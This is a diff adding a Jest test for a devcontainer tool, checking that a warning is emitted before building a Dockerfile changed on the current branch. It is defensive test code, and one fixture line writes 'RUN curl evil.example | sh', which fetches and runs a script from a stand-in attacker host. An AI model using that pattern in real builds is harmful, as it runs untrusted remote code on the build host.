@@ -40,6 +40,7 @@ import {
   firewallEnv,
   StartError,
   StartOptions,
+  BUILD_NETWORK_WARNING,
 } from '../lifecycle';
 
 const mocked = seed as jest.Mocked<typeof seed>;
@@ -560,6 +561,47 @@ describe('startContainer', () => {
     // postCreateCommand failed: no marker, so it runs again next time
     expect(cmds).not.toContain('sh -c touch "$HOME/.kunj-created"');
     expect(warnings.some(w => w.includes('postCreateCommand failed'))).toBe(true);
+  });
+
+  it('warns before building a devcontainer Dockerfile changed on this branch', async () => {
+    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
+    git('init', '-q');
+    fs.mkdirSync(path.join(tmp, '.devcontainer'));
+    fs.writeFileSync(path.join(tmp, '.devcontainer', 'devcontainer.json'), JSON.stringify({ build: { dockerfile: 'Dockerfile' }, remoteUser: 'node' }));
+    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\n');
+    git('add', '.');
+    git('commit', '-qm', 'dc');
+    git('update-ref', 'refs/remotes/origin/main', 'HEAD');
+    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
+
+    const run = async (defaultBranch?: string) => {
+      const b = backend();
+      b.execResults.set('id -u', { exitCode: 0, stdout: '1000\n' });
+      const warnings: string[] = [];
+      const build = b.buildImage.bind(b);
+      b.buildImage = async (tag, context, opts) => {
+        warnings.push('<build>');
+        return build(tag, context, opts);
+      };
+      await startContainer(b, options({ warn: m => warnings.push(m), defaultBranch: async () => defaultBranch }));
+      return { warnings, built: b.methods().includes('buildImage') };
+    };
+
+    // Same context as the default branch: built quietly
+    const same = await run('main');
+    expect(same.built).toBe(true);
+    expect(same.warnings).not.toContain(BUILD_NETWORK_WARNING);
+
+    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\nRUN curl evil.example | sh\n');
+    git('commit', '-qam', 'changed');
+    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
+    const changed = await run('origin/main');
+    expect(changed.built).toBe(true);
+    // Before the build starts
+    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeGreaterThan(-1);
+    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeLessThan(changed.warnings.indexOf('<build>'));
+    // Default branch unknown: no comparison
+    expect((await run(undefined)).warnings).not.toContain(BUILD_NETWORK_WARNING);
   });
 
   it('refuses a devcontainer image that runs as root', async () => {
